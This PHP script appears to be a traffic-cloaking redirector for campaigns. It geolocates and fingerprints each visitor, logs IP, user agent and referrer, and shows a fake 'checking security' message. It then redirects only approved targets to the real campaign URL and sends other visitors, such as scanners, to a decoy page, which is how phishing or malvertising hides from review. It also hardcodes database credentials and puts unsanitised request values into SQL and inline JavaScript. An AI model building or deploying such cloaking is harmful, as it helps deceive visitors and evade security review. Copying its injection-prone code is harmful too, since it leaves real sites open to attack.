<?php
$id=$_GET['id'];
$uid="12";
$safeurl="";
$conn=mysqli_connect('localhost','id15832372_root','FBo$?wJTyzH0-%05','id15832372_daata');
  $q="SELECT * FROM `camps`";
	 $r=mysqli_query($conn,$q);
	 while($row=(mysqli_fetch_assoc($r)))
	 {
	     
	     if($row['id']==$id)
	     {
	         $url=$row['c_url'];
	         $safeurl=$row['c_host'];
	     }
	 }
	 $ip =$_SERVER['REMOTE_ADDR'] ;
	 
	 $chk="free";
	 
	
	 $u=$_SERVER['HTTP_USER_AGENT'];
	 
	 ////////////////////////////////////////////checking previous/////////////////////////
$prev=$_SERVER['HTTP_REFERER'];
if($prev=="")
{
    $prev="direct";
}
  $q211="SELECT * FROM `allow_coming`";
	 $r1=mysqli_query($conn,$q211);
	 while($ro=(mysqli_fetch_assoc($r1)))
	 {
	     
	     if($ro['c_id']==$id)
	     {
	         
	         if (strstr($prev,$ro['domain'] ) !== false) 
	         {
	             $chk="free";
	             break;
	         }
	         else
	         {
	             $chk="jail";
	         }
	     }
	 }

	 ////////////////////////////////////////////checking previous/////////////////////////
	 ////////////////////////////////////////////checking Country/////////////////////////
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
if($query && $query['status'] == 'success') {
  $c= $query['country'];
} else {
  $c= 'using proxy';
}

$qcountry="SELECT * FROM `allow_country`";
	 $rcount=mysqli_query($conn,$qcountry);
	 while($rcou=(mysqli_fetch_assoc($rcount)))
	 {
	        
	     if($rcou['c_id']==$id)
	     {
	         
	         if (strtolower($c)==strtolower($rcou['allow_country'] ))
	         {
	             $chk="free";
	             break;
	         }
	         else
	         {
	             $chk="jail";
	         }
	     }
	 }
	 
	 
	 ////////////////////////////////////////////checking Country/////////////////////////
 ////////////////////////////////////////////checking Ip is blocked/////////////////////////
	 
    $q21="SELECT * FROM `creds`";
	 $r=mysqli_query($conn,$q21);
	 while($row=(mysqli_fetch_assoc($r)))
	 {
	        
	     if($row['c_id']==$id)
	     {
	         if($row['battle']!="free" && ($row['ip']==$ip))
	         {
	            $chk=$row['battle'];
	         }
	     }
	 }
	 
	 
	 ////////////////////////////////////////////checking Ip is blocked/////////////////////////

	  $q1="INSERT INTO `creds` ( `c_id`, `ip`, `agent`, `region`, `battle`, `came_from`) VALUES ( '$id', '$ip', '$u', '$c','free','$prev')";
	 $r=mysqli_query($conn,$q1);

	 echo "
Please wait ! checking security...";
if($chk=="free")
{
    
echo "
<script>
setTimeout(function() {
    window.location.assign('$url');
}, 3000);
</script>
";
}
else
{
    echo "
<script>
setTimeout(function() {
    window.location.assign('$safeurl');
}, 3000);
</script>
";
}
?>